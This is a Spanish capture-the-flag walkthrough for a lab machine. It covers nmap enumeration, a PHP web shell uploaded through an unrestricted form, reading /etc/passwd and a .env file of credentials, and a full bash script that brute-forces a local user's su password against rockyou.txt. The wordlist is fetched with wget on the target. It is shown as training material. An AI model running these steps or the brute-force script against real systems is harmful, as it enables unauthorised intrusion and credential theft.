#machine
Partimos de la información siguiente para solucionar la máquina:
![[Pasted image 20250126023947.png]]
#### IP: 172.17.0.2 *La dirección ip puede variar, consultar en el autodeploy*

## Fase 1: Recolección de Información
```java
┌─[root@parrot]─[/home/j0rd1s3rr4n0/TramuntHack/VulnWeb]
└──╼ #ping 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.072 ms
^C
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.072/0.072/0.072/0.000 ms
```
Primero realizamos un ping para visualizar si tenemos alcance a la máquina. A raíz de ahi obtenemos comunicación lanzando paquetes ICMP que llegan de vuelta, eso quiere decir que tenemos conexión con la máquina. Si nos fijamos en la siguiente línea podremos obtener más info:

64 bytes from 172.17.0.2: icmp_seq=1 ==ttl=64== time=0.072 ms

Resaltado obtenemos el [TTL](https://www.cloudflare.com/es-es/learning/cdn/glossary/time-to-live-ttl/) (Tiempo de vida de un paquete de red) encontramos que nos devuelve el numero **64**, es importante porque nos ayuda a identificar el sistema operativo.

![[Pasted image 20250126024701.png]]

<table><tbody><tr><td><strong>Device / OS</strong></td><td><strong>Version</strong></td><td><strong>Protocol</strong></td><td><strong>TTL</strong></td></tr><tr><td>AIX</td><td></td><td>TCP</td><td>60</td></tr><tr><td>AIX</td><td></td><td>UDP</td><td>30</td></tr><tr><td>Android</td><td>3.2.1</td><td>TCP and ICMP</td><td>64</td></tr><tr><td>Android</td><td>5.1.1</td><td>TCP and ICMP</td><td>64</td></tr><tr><td>AIX</td><td>3.2, 4.1</td><td>ICMP</td><td>255</td></tr><tr><td>BSDI</td><td>BSD/OS 3.1 and 4.0</td><td>ICMP</td><td>255</td></tr><tr><td>Compa</td><td>Tru64 v5.0</td><td>ICMP</td><td>64</td></tr><tr><td>Cisco</td><td></td><td>ICMP</td><td>254</td></tr><tr><td>DEC Pathworks</td><td>V5</td><td>TCP and UDP</td><td>30</td></tr><tr><td>Foundry</td><td></td><td>ICMP</td><td>64</td></tr><tr><td>FreeBSD</td><td>2.1R</td><td>TCP and UDP</td><td>64</td></tr><tr><td>FreeBSD</td><td>3.4, 4.0</td><td>ICMP</td><td>255</td></tr><tr><td>FreeBSD</td><td>5</td><td>ICMP</td><td>64</td></tr><tr><td>HP-UX</td><td>9.0x</td><td>TCP and UDP</td><td>30</td></tr><tr><td>HP-UX</td><td>10.01</td><td>TCP and UDP</td><td>64</td></tr><tr><td>HP-UX</td><td>10.2</td><td>ICMP</td><td>255</td></tr><tr><td>HP-UX</td><td>11</td><td>ICMP</td><td>255</td></tr><tr><td>HP-UX</td><td>11</td><td>TCP</td><td>64</td></tr><tr><td>Irix</td><td>5.3</td><td>TCP and UDP</td><td>60</td></tr><tr><td>Irix</td><td>6.x</td><td>TCP and UDP</td><td>60</td></tr><tr><td>Irix</td><td>6.5.3, 6.5.8</td><td>ICMP</td><td>255</td></tr><tr><td>juniper</td><td></td><td>ICMP</td><td>64</td></tr><tr><td>MPE/IX (HP)</td><td></td><td>ICMP</td><td>200</td></tr><tr><td>Linux</td><td>2.0.x kernel</td><td>ICMP</td><td>64</td></tr><tr><td>Linux</td><td>2.2.14 kernel</td><td>ICMP</td><td>255</td></tr><tr><td>Linux</td><td>2.4 kernel</td><td>ICMP</td><td>255</td></tr><tr><td>Linux</td><td>Red Hat 9</td><td>ICMP and TCP</td><td>64</td></tr><tr><td>MacOS/MacTCP</td><td>2.0.x</td><td>TCP and UDP</td><td>60</td></tr><tr><td>MacOS/MacTCP</td><td>X (10.5.6)</td><td>ICMP/TCP/UDP</td><td>64</td></tr><tr><td>NetBSD</td><td></td><td>ICMP</td><td>255</td></tr><tr><td>Netgear FVG318</td><td></td><td>ICMP and UDP</td><td>64</td></tr><tr><td>OpenBSD</td><td>2.6 &amp; 2.7</td><td>ICMP</td><td>255</td></tr><tr><td>OpenVMS</td><td>07.01.2002</td><td>ICMP</td><td>255</td></tr><tr><td>OS/2</td><td>TCP/IP 3.0</td><td></td><td>64</td></tr><tr><td>OSF/1</td><td>V3.2A</td><td>TCP</td><td>60</td></tr><tr><td>OSF/1</td><td>V3.2A</td><td>UDP</td><td>30</td></tr><tr><td>Solaris</td><td>2.5.1, 2.6, 2.7, 2.8</td><td>ICMP</td><td>255</td></tr><tr><td>Solaris</td><td>2.8</td><td>TCP</td><td>64</td></tr><tr><td>Stratus</td><td>TCP_OS</td><td>ICMP</td><td>255</td></tr><tr><td>Stratus</td><td>TCP_OS (14.2-)</td><td>TCP and UDP</td><td>30</td></tr><tr><td>Stratus</td><td>TCP_OS (14.3+)</td><td>TCP and UDP</td><td>64</td></tr><tr><td>Stratus</td><td>STCP</td><td>ICMP/TCP/UDP</td><td>60</td></tr><tr><td>SunOS</td><td>4.1.3/4.1.4</td><td>TCP and UDP</td><td>60</td></tr><tr><td>SunOS</td><td>5.7</td><td>ICMP and TCP</td><td>255</td></tr><tr><td>Ultrix</td><td>V4.1/V4.2A</td><td>TCP</td><td>60</td></tr><tr><td>Ultrix</td><td>V4.1/V4.2A</td><td>UDP</td><td>30</td></tr><tr><td>Ultrix</td><td>V4.2 – 4.5</td><td>ICMP</td><td>255</td></tr><tr><td>VMS/Multinet</td><td></td><td>TCP and UDP</td><td>64</td></tr><tr><td>VMS/TCPware</td><td></td><td>TCP</td><td>60</td></tr><tr><td>VMS/TCPware</td><td></td><td>UDP</td><td>64</td></tr><tr><td>VMS/Wollongong</td><td>1.1.1.1</td><td>TCP</td><td>128</td></tr><tr><td>VMS/Wollongong</td><td>1.1.1.1</td><td>UDP</td><td>30</td></tr><tr><td>VMS/UCX</td><td></td><td>TCP and UDP</td><td>128</td></tr><tr><td>Windows</td><td>for Workgroups</td><td>TCP and UDP</td><td>32</td></tr><tr><td>Windows</td><td>95</td><td>TCP and UDP</td><td>32</td></tr><tr><td>Windows</td><td>98</td><td>ICMP</td><td>32</td></tr><tr><td>Windows</td><td>98, 98 SE</td><td>ICMP</td><td>128</td></tr><tr><td>Windows</td><td>98</td><td>TCP</td><td>128</td></tr><tr><td>Windows</td><td>NT 3.51</td><td>TCP and UDP</td><td>32</td></tr><tr><td>Windows</td><td>NT 4.0</td><td>TCP and UDP</td><td>128</td></tr><tr><td>Windows</td><td>NT 4.0 SP5-</td><td></td><td>32</td></tr><tr><td>Windows</td><td>NT 4.0 SP6+</td><td></td><td>128</td></tr><tr><td>Windows</td><td>NT 4 WRKS SP 3, SP 6a</td><td>ICMP</td><td>128</td></tr><tr><td>Windows</td><td>NT 4 Server SP4</td><td>ICMP</td><td>128</td></tr><tr><td>Windows</td><td>ME</td><td>ICMP</td><td>128</td></tr><tr><td>Windows</td><td>2000 pro</td><td>ICMP/TCP/UDP</td><td>128</td></tr><tr><td>Windows</td><td>2000 family</td><td>ICMP</td><td>128</td></tr><tr><td>Windows</td><td>Server 2003</td><td></td><td>128</td></tr><tr><td>Windows</td><td>XP</td><td>ICMP/TCP/UDP</td><td>128</td></tr><tr><td>Windows</td><td>Vista</td><td>ICMP/TCP/UDP</td><td>128</td></tr><tr><td>Windows</td><td>7</td><td>ICMP/TCP/UDP</td><td>128</td></tr><tr><td>Windows</td><td>Server 2008</td><td>ICMP/TCP/UDP</td><td>128</td></tr><tr><td>Windows</td><td>10/11</td><td>ICMP/TCP/UDP</td><td>128</td></tr></tbody></table>

[Más Información sobre identificación de sistema operativo a raíz del TTL](https://ostechnix.com/identify-operating-system-ttl-ping/)

Así pues sacamos en claro que nos enfrentamos a un sistema Operativo **Linux**

Ahora vamos a enumerar los puertos del sistema.
```java
┌─[root@parrot]─[/home/j0rd1s3rr4n0/TramuntHack/VulnWeb]
└──╼ #nmap -sS -sV -O -T5 -p- --open 172.17.0.2

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 03:51 CET
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Escaneamos todos los 65533 puertos del sistema en busca de solamente los puertos abiertos y encontramos dos puertos abiertos, el **22/tcp** y el **80/tcp** que podemos ver que se tratan de:
- **22/tcp** : OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
- **80/tcp** : Apache httpd 2.4.58 ((Ubuntu))

Vamos a usar Whatweb para analizar el contenido de la web, detectar tecnologías y versiones.
```java
┌─[root@parrot]─[/home/j0rd1s3rr4n0/TramuntHack/VulnWeb]
└──╼ $whatweb -a 3 -v 172.17.0.2
WhatWeb report for http://172.17.0.2
Status    : 200 OK
Title     : Index | MFW
IP        : 172.17.0.2
Country   : RESERVED, ZZ

Summary   : Apache[2.4.58], Frame, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.58 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ Frame ]
	This plugin detects instances of frame and iframe HTML 
	elements. 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.58 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Mon, 27 Jan 2025 09:16:16 GMT
	Server: Apache/2.4.58 (Ubuntu)
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 1423
	Connection: close
	Content-Type: text/html; charset=UTF-8

```

Tratamos de acceder a la ip mediante el puerto 80 usando el navegador y visualizamos lo siguiente:
![[Pasted image 20250126025823.png]]
Visualizamos una web que parece ser la primera del desarrollador. Identificamos 4 rutas:
1. **UPLOAD**
2. **HOME**
3. **FOLDER**
4. **LOGIN**

Analizando las tecnologías que usa la web, con Wappalyzer identificamos lo siguiente:
- **Widget:** SoundCloud
- **Tipografía**: Google Font API
- **Servidor Web**: Apache HTTP Server 2.4.58
- **Lenguaje de programación**: PHP
- **Sistema Operativo**: Ubuntu

Navegando a **FOLDER**:
![[Pasted image 20250126030410.png]]
Obtenemos como un Listado de Archivos que se han subido al servidor web y nos permite visualizar el archivo y/o descargar la información de los mismos.

Navegando a **LOGIN**:
![[Pasted image 20250126030603.png]]
Visualizamos un panel de inicio de sesión donde se nos muestra el siguiente desplegable de usuarios: <select name="username" id="username">
        <option value="Select User">Select User</option><option value="Admin">Admin</option><option value="pepe">pepe</option><option value="armando">armando</option></select> . Y nos pide también una contraseña.

Navegando a **UPLOAD**:
![[Pasted image 20250126030830.png]]
Se nos muestra este formulario donde podemos subir archivos. La primera hipótesis es que se subirán a la misma carpeta que hemos podido visualizar desde la web. Podemos Tratar de Subir archivos a ver que restricciones tiene.

Voy a tratar de subir una Web Shell, [WebShell Github](https://github.com/j0rd1s3rr4n0/TramuntHackCTF/blob/attacker/shell.php) pero también podéis usar las de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) o las de [revshells](https://www.revshells.com/), con las que os sintáis más cómodos.
![[Pasted image 20250126033446.png]]
Nos redirige a una pagina llamada up.php mostrandonos un mensaje de *El archivo shell.php Subido correctamente.* Así pues vamos a comprovar si podemos visualizarlo en la ruta de **FOLDER**.
![[Pasted image 20250126033630.png]]
Y efectivamente podemos visualizarlo e incluso ejecutarlo. 
![[Pasted image 20250126033905.png]]
Aquí podemos visualizar la ruta entera del archivo, accederemos para tener una optima visión de la WebShell.

En este punto no recuerdo la contraseña que le he añadido a la WebShell asi que procedo a visualizar el código:
```php
<?php error_reporting (0);?>
<?php 
session_start();
$password = "0f359740bd1cda994f8b55330c86d845";
//Admin1234
if($_POST['password']){
[...]
```
copiamos el hash md5 y accedemos a [CrackStation](https://crackstation.net/)
![[Pasted image 20250126034146.png]]
Como puse una contraseña genérica que estaba en el rockyou.txt pues esta filtrada y desde crackstation podemos visualizarla en texto plano. Así pues accedemos al panel con la contraseña `p@ssw0rd`.

![[Pasted image 20250126034417.png]]
Esta webshell esta pensada para que sin hacer nada ya te este dando información del Sistema Operativo, del usuario de sistema, del hostname e incluso del path donde nos situamos.
Así pues podemos visualizar que en la propia carpeta hay archivos que pese a estar subidos no son visibles a través de la pagina **UPLOADS**.

Así pues ya podemos ejecutar comandos aunque no estamos con ningun usuario local del sistema sino el usuario que ejecuta el servicio apache2 (www-data).
```java
www-data@861ac52240d6:…/html/uploads# ls -la
total 332
drwxr-xr-x 1 www-data www-data     92 Jan 26 03:34 .
drwxr-xr-x 1 www-data www-data    118 Dec 26 04:03 ..
-rwxr-xr-x 1 www-data www-data  21752 Dec 20 13:48 .shell.php
-rwxr-xr-x 1 www-data www-data   9879 Dec 20 13:48 index.php
-rwxr-xr-x 1 www-data www-data 271755 Dec 22 19:52 memaso.png
-rw-r--r-- 1 www-data www-data  20974 Jan 26 03:34 shell.php
-rwxr-xr-x 1 www-data www-data     25 Dec 20 13:48 test.txt

www-data@861ac52240d6:…/html/uploads# cd ..
www-data@861ac52240d6:…/www/html# ls
flag.txt
index.php
login.php
logout.php
up.php
upload.php
uploads

www-data@861ac52240d6:…/www/html# cat flag.txt
NOT A FLAG :) I'm So S0rRy
```
Hemos retrocedido el path a la raíz de la web y podemos visualizar un archivo que se llama ***flag.txt***
pero no contiene ninguna flag

Aprovechamos también para enumerar los usuarios de sistema.
```java
www-data@861ac52240d6:…/www/html# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
pepe:x:1001:1001:Full Name The Karten,208,34666666666,34966666666,This is the Karten:/home/pepe:/bin/bash
admin:x:1002:1002:Full Name The Karten,208,34666666666,34966666666,This is the Karten:/home/admin:/bin/bash
armando:x:1003:1003:Full Name The Karten,208,34666666666,34966666666,This is the Karten:/home/armando:/bin/bash
```

Con esta información obtenemos en claro lo siguiente:
```java
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin (Usuario Actual)
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
pepe:x:1001:1001::/home/admin:/bin/bash
admin:x:1002:1002::/home/admin:/bin/bash
armando:x:1003:1003::/home/armando:/bin/bash
```

También vamos a tratar de visualizar si hay usuarios o contraseñas HARDCODED en alguna parte del código y obtenemos lo siguiente:
```java
www-data@861ac52240d6:…/www/html# cat * | grep -E "password|username"
$username = 'pepe';
$password = 'Admin1234';
		<p>Hello <?php echo $username; ?>!</br></p>
	if ($_POST['username'] == $username && $_POST['password'] == $password){
		echo '<p style="color:white;font-size:24px;"><font style="background-color:red;padding:5px;border:3px white solid;border-radius:10px;">Username or password is invalid</font></p>';
		<label for="username">username</label>
		<input type="text" name="username" id="username">
		<label for="password">password</label>
		<input type="password" name="password" id="password">
  		  <select name="username" id="username">
  			<input type="password" name="password" id="password" required="required" placeholder="No Password"><br>
background-position: bottom;} img{border: 0;} *::selection{background-color: inherit; color:inherit;} *::-moz-selection{ background-color: inherit; color:inherit; } .login{ width: 300px; height: 350px; margin: 200px auto; background-color: #FFFFFF; border-radius: 6px; border: 2px solid #999; box-shadow: 0 0 12px #333; display: block; } .login h1{ text-align: center; text-transform: uppercase; color: #333; } .profile{ width: 75px; height: 75px; border-radius: 50px; margin: 0 auto; background-image: url('https://static.thenounproject.com/png/55393-200.png'); background-position: center center; background-size: cover; background-repeat: no-repeat; transition: all ease-in-out; } #username{width: 149px;} p{text-align: center;} #background{ position: absolute; top: 0; left: 0; z-index: -1; overflow: hidden; } #login{display: block;} #btnLogin{ width: 150px; height: 40px; outline: none; } .desktop{display: none; margin: 0; padding: 0;} .desktop a.icon{ width: 100px !important; height: 90px; margin: 0; padding: 10px 0; position: absolute; top: 25px; left: 25px; text-decoration: none; font-weight: 100; color: #fff; text-align: center; display: block; background-color: rgba(0, 0, 0, 0.2); border-radius: 4px; } .desktop a.icon span{ margin: 0; padding: 0; text-decoration: none; color: #fff; } .desktop a.icon:hover{background-color: rgba(0, 0, 0, 0.3);} .desktop .window{ width: 80%; height: 700px; margin: 0 auto; padding: 0 auto; display: none; /* none */ background-color: #FFFFFF; position: relative; top: 20px; margin-top: 30px; padding-top:0; color: #FFF; bottom: 28px; z-index: 1; border-radius: 6px 6px 4px 4px; box-shadow: 0px 0px 15px #000000; resize: both; } .desktop .window .notepad{ display: block; width: 80%; height: 80%; margin:0 auto; } .desktop .window .window-top-bar{ width: 100%; height: 30px; display: block; background-color: #292929; border-radius: 4px 4px 0px 0px; } .desktop .window .title{ text-align: center; height: 32px; width: 80%; line-height: 32px; float: left; padding-left:10%; font-weight: 700; } .window .controls{ width: 5; height: 32px; float: right; font-size: 8px; margin-right: 0; } .window .controls span{ height: 20px; color: #000; line-height: 20px; width: 20px; display: block; float: left; text-align: center; margin: 5px 3px; background-color: #444; cursor: pointer; border-radius: 12px; transition: background-color 0.2s ease; } .window .controls span#close{background-color: #e67e22;} .window .controls span:hover{background-color: #666;} .window .controls span#close{background-color: #e67e22;} .window-navigation{ width: 100%; box-sizing: border-box; height: 40px; line-height: 38px; background-color: #CCC; text-align: left; padding-left: 5px; } .window-navigation input{ border: none; height: 30px; width: 30px; color: #333; } .window-navigation input[type="submit"]{ cursor: pointer; outline: none; } .window-navigation #frameURL{ width: 92.3%; padding-left: 5px; height: 28px; } .window-content{ color: #000; width: 99.6%; height: 70%; } .window-content iframe{ max-width: 100%; max-height: 100%; border: none; } .window-content textarea{ width: 100%; height: 100%; } .desktop .bottom-bar{ color: #FFF; width: 100%; height: 28px; line-height:28px; position: absolute; bottom: 0; display: none; background-color: rgba(0, 0,0, 0.7); z-index: 10; font-family: arial; font-size: 12px; text-align: center; } .bottom-bar div.panel{ width: 300px; position: absolute; bottom: 30px; left: 0px; margin: 0; padding: 0; background-color: rgba(0,0,0, 0.6); display: none; text-align: left; font-size: 14px; } .bottom-bar div.panel ul{list-style: none;} .bottom-bar div.panel ul li a{color: #FFF; text-decoration: none;} .bottom-bar div.panel ul li a:hover{color: #FFF;} .bottom-bar a.app{ color: #fff; display:none; width: 100px; line-height: 28px; background-color: rgba(255,255,255, 0.1); float: left; text-decoration: none; } a.app span{padding-left: 8px; position:relative; top:-6px} .bottom-bar a#menu{ color: #FFF; text-decoration: none; padding: 0px 13px 7px 13px; line-height: 28px; float: left; width: 30px; background-color: rgba(255,255,255, 0.2); } .bottom-bar .panel .panel-icons ul{ margin: 0;  padding: 0; width: 65px; height: 100%; float: left; } .bottom-bar .panel .panel-icon img{ width: 30px; height: 30px; margin: 0; padding: 0; } .bottom-bar a.chrome{ color: #fff; display: none; box-sizing: border-box; background-color: rgba(255,255,255, 0.1); float: left; text-decoration: none; text-align: left; padding: 0 10px } .bottom-bar a:chrome img{float:left; clear: left;} .left{float:left;} .clear{clear: both;}</style>
  var select = d.getElementById('username'),
```

¿Que obtenemos en claro? Obtenemos un usuario `pepe` y contraseña `Admin1234` en alguna parte de la web.
```java
$username = 'pepe';
$password = 'Admin1234';
```

Vamos a tratar de ver si son las credenciales del panel de **LOGIN** (que es lo más lógico). 
![[Pasted image 20250126035457.png]]
Y...
![[Pasted image 20250126035520.png]]
Pues parece ser que no nos muestra más información de la que ya hemos podido obtener anteriormente. Vamos a seguir navegando entre directorios.
```java
www-data@861ac52240d6:…/www/html# cd ..
www-data@861ac52240d6:/var/www# ls -la
total 8
drwxr-xr-x 1 root     root       52 Dec 30 02:47 .
drwxr-xr-x 1 root     root       96 Dec 30 02:47 ..
-rwxr-xr-x 1 root     root      281 Dec 30 02:47 .env
drwxr-xr-x 1 www-data www-data  118 Dec 26 04:03 html
-rw-r--r-- 1 root     root     1120 Dec 30 02:47 ssh_credentials.md
```

Encontramos dos archivos que nos llaman la atención.
- El archivo `.env` normalmente contienen credenciales en formato clave-valor para los servicios utilizados por el programa que están creando.
```java
APP_NAME=VULNWEB
APP_ENV=local
APP_KEY=base64:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=
APP_DEBUG=true
APP_URL=http://vulnweb.com

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=nombre_de_tu_base_de_datos
DB_USERNAME=notroot
DB_PASSWORD=NotAdmin1234
```
Esta información parece estar incompleta y ser genérica pero contiene **usuario** y **contraseña** de base de datos **mysql**. 

- El archivo `ssh_credentials.md` parece que se trata de una nota Markdown con las credenciales de alguno de los usuarios.
```python
www-data@861ac52240d6:/var/www# cat ssh_*
**TODO: Resolver el enigma de "armando" para obtener su credencial**
El terreno está preparado para el combate, donde el sonido de los pasos resonará en cada rincón.
Un tambor golpea implacable, marcando el paso de una multitud que avanza con fuerza. La vibra de
una era de gloria se enciende, y el eco de unos puños al unísono prepara la lucha. El visitante
no está solo: se une a miles, y juntos desafían lo imposible.

En cada rincón, las sombras se dispersan y la verdad se alza: aquellos que nunca se rindieron
están listos para hacer temblar el suelo. La multitud sigue la llamada, sus pies golpeando al
ritmo del tambor. El desafío está planteado: ¿estás listo para unirte a la batalla?

El poder no está en lo que temes, sino en lo que eres capaz de conquistar. La fortaleza no
proviene de muros, sino de la unidad, el rugido de la multitud, y el grito de guerra que te
empuja a seguir adelante. Encuentra tu fuerza, sigue el ritmo, y sabrás qué se necesita para
triunfar. Recuerda: el tambor nunca deja de sonar. Y con un poco de fuerza brutal y un toque de
sabiduría, la victoria será tuya.
```
Parece ser que no nos da la contraseña en texto claro, pero si nos indica que usuario el el target. Para la contraseña nos comenta un acertijo que parece ser una canción o una historia, quizás a este punto podamos pedir ayuda a nuestro amigo sabelotodo ChatGPT:
![[Pasted image 20250126040443.png]]

Nos vamos a quedar con la siguiente respuesta

¡Ah, ahora lo entiendo! El acertijo está claramente inspirado en la letra de =="We Will Rock You"== de Queen. El tambor, el ritmo de los pasos, la multitud avanzando con fuerza, y la sensación de lucha y unidad son elementos clave de esta canción. El famoso "boom boom clap" y la energía de la letra transmiten la idea de enfrentar desafíos y seguir adelante con determinación.

Al llegar a este punto nos tendria que venir a la cabeza que la canción ***"We Will Rock You"*** está relacionada con un archivo muy pero que muy conocido en ciberseguridad llamado **[rockyou.txt](https://fwhibbit.es/yow-rockyou-txt-que-es-eso)** que se puede descargar [aquí](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) con un peso de 133MB o si se está usando Kali Linux o Parrot Os debería ya estar situado en la carpeta `/usr/share/WordList/` (en Kali Linux) o la carpeta `/usr/share/SecLists/Passwords/` (en Parrot os), este puede no estar como rockyou.txt sino comprimido con gzip para ocupar menos.

Con esto nos indican que la contraseña podría estar situada en el archivo rockyou.txt y podriamos tratar de realizar un ataque de fuerza bruta con Hydra por ejemplo. Pero tardaría mucho tiempo, en este punto **ElPingüinoDeMario** y yo os traemos una herramienta que en este caso es muy útil. Nos permitirá realizar fuerza bruta desde el propio sistema víctima así pues ahorraremos tiempo pero podría hacer saltar alarmas ya sea por numero de intentos fallidos o por rendimiento del sistema.

¿De que herramienta se trata?
[https://github.com/j0rd1s3rr4n0/Sudo_BruteForce](https://github.com/j0rd1s3rr4n0/Sudo_BruteForce)

**Sudo_BruteForce** es un listado de Scripts hecho en bash, Golang, Python y C para realizar un ataque de fuerza bruta a un usuario de un sistema Linux. Requiere de un diccionario.

En este caso usaremos el de bash para no tener que compilar nada, aunque el recomendable seria el de C ya que es de los más rápidos.

Podemos descargar el script directamente de aquí: [https://github.com/j0rd1s3rr4n0/Sudo_BruteForce/blob/main/Linux-Su-Force.sh](https://github.com/j0rd1s3rr4n0/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)
```bash
#!/bin/bash

# Función que se ejecutará en caso de que el usuario no proporcione 2 argumentos.
mostrar_ayuda() {
    echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"
    echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"
    exit 1
}

# Para imprimir un sencillo banner en alguna parte del script.
imprimir_banner() {
    echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante
    echo "******************************"
    echo "*     BruteForce SU         *"
    echo "******************************"
    echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados
}

# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)
finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

# Variable especial $# para comprobar el número de parámetros introducido. En caso de no ser 2, se imprimen las instrucciones.
if [[ $# != 2 ]]; then
    mostrar_ayuda
fi

# Imprimimos el banner al momento de realizar el ataque.
imprimir_banner

# Bucle while que lee línea a línea el contenido de la variable $diccionario, que a su vez esta variable recibe el diccionario como parámetro.
while IFS= read -r password; do
    echo "Probando contraseña: $password"
    if timeout 0.1 bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32mContraseña encontrada para el usuario $usuario: $password\e[0m"
        break
    fi
done < "$diccionario"
```
Pero aquí vamos a tener que realizar un cambio que en un sistema con bajos recursos podría llegar a saturar más el sistema. Vamos a cambiar el `timeout 0.1` a `timeout 0.05`. Solamente en caso de falsos positivos o de sistema con bajos recursos volvería al **0.1** o incluso si hace falta a entre **0.5** y **1**.

¿Cómo lo vamos a subir? Pues vamos a subir tanto el diccionario como el script igual que como hemos subido el archivo **shell.php** o bien podríamos con **python abrir un servidor web** y con **wget** o **curl** descargar los archivos, pero esta segunda opción podría hacer saltar muchas alarmas al generar una conexión saliente y no entrante. Así pues, usaremos la opción más fácil y cómoda para también evitar problemas con permisos en los ficheros y directorios en los que trabajaremos.

Se ha tratado de subir al archivo rockyou.txt sin comprimir y da error al subir, supongo que por el tamaño máximo de trabajo configurado en el servidor web.

Alternativa:
```java
www-data@861ac52240d6:…/html/uploads# curl -s https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt
sh: 1: curl: not found

www-data@861ac52240d6:…/html/uploads# wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
--2025-01-26 04:37:57--  https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 139921497 (133M) [application/octet-stream]
Saving to: 'rockyou.txt'

     0K .......... .......... .......... .......... ..........  0% 1.89M 71s
    50K .......... .......... .......... .......... ..........  0% 3.65M 54s
   100K .......... .......... .......... .......... ..........  0% 19.1M 38s  
                                      [...]
136550K .......... .......... .......... .......... .......... 99%  224M 0s
136600K .......... .......... .......... .......... ..        100%  197M=2.4s

2025-01-26 04:38:00 (54.9 MB/s) - 'rockyou.txt' saved [139921497/139921497]


www-data@861ac52240d6:…/html/uploads# ls -la
total 136980
drwxr-xr-x 1 www-data www-data       124 Jan 26 04:39 .
drwxr-xr-x 1 www-data www-data       118 Dec 26 04:03 ..
-rwxr-xr-x 1 www-data www-data     21752 Dec 20 13:48 .shell.php
-rwxr-xr-x 1 www-data www-data      9879 Dec 20 13:48 index.php
-rwxr-xr-x 1 www-data www-data    271755 Dec 22 19:52 memaso.png
-rw-r--r-- 1 www-data www-data 139921497 Dec  8  2021 rockyou.txt
-rw-r--r-- 1 www-data www-data     20974 Jan 26 03:34 shell.php
-rw-r--r-- 1 www-data www-data      1600 Jan 26 04:36 su.sh
-rwxr-xr-x 1 www-data www-data        25 Dec 20 13:48 test.txt
```

